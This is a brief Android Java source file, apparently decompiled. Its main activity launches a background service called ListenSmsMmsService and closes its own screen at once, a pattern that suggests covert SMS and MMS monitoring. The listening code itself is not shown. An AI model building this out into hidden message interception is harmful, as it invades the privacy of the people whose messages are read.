package stupuid.maga.legacy;

import android.content.Intent;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView((int) R.layout.activity_main);
        startService(new Intent(getApplicationContext(), ListenSmsMmsService.class));
        finish();
    }
}
